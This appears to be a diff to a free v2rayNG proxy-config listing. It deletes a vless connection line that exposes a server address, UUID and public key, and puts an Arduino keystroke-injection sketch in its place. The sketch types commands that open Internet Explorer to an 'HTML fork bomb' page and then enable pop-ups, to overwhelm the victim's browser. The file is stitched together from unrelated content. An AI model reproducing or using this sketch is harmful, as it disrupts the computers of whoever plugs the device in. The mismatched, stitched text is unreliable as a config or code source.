@@ -1,5 +1,55 @@
-vless://5b2e9c96-bf5c-4a4c-a47c-eb363d77f903@real.amirix.sbs:45460?type=grpc&serviceName=&security=reality&fp=firefox&pbk=JbeZRSYur31ly-vl7N7OTsxg2bZIJnX45qfxaLPa2Ws&sni=ftp.debian.org.www.debian.org&sid=810c2dc8&spx=%2F#unlimited-taheri
+/*
+ * Generated with <3 by Dckuino.js, an open source project !
+ */
 
+#include "Keyboard.h"
+
+void typeKey(uint8_t key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  delay(2000);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+  Keyboard.press(KEY_ESC);
+  Keyboard.releaseAll();
+
+  delay(200);
+
+  Keyboard.print("C:\\Program Files\\Internet Explorer\\iexplore.exe https://jonnybanana.github.io/HTML-Fork-Bomb.github.io/");
+
+  delay(200);
+
+  typeKey(KEY_RETURN);
+
+  // set a long delay to give time to this disgusting browser
+  delay(1000);
+
+  // it's time to enable Pop-Up
+  typeKey(KEY_TAB);
+
+  delay(200);
+
+  typeKey(KEY_RETURN);
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
 
 # v2rayNG
 v2rayNG Config Free 
